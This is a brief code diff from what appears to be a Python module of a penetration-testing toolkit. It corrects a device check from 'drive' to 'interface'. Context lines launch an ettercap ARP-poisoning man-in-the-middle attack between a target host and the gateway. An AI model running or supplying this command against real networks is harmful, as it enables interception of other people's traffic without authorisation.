@@ -36,7 +36,7 @@ def init():
 # CODE MODULE    ############################################################################################
 def main(run):
 
-	if isConect() and checkDevice(init.var['drive']):
+	if isConect() and checkDevice(init.var['interface']):
 		printAlert(0,"Starting ARP Poisoning...")
 		Subprocess("ettercap -T -M ARP /"+init.var['target']+"// /"+init.var['gateway']+"// -i "+init.var['interface'])
 		raw_input(printAlert(8,"Stop Attack ARP (PRESS ANY KEY)\n"))
